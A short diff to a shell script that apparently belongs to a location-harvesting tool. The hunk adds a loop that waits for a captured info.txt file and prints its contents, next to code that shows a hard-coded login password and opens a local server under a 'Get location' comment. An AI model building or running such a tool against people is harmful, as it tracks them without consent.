@@ -91,6 +91,14 @@ printf "${S4}Password to login ${S1}:: ${S2}dearsuman${R0}\n"
 xdg-open http://127.0.0.1:8084
 #<<<---Get location--->>>#
 while true; do
+    if [ -z $(cat $CWD/assets/send/php/info.txt) ]; then
+        sleep 0.3
+    else
+        cat $CWD/assets/send/php/info.txt | jq 
+        break
+    fi
+done
+while true; do
     if [ -z $(cat $CWD/assets/send/php/result.txt) ]; then
         sleep 0.3
     else
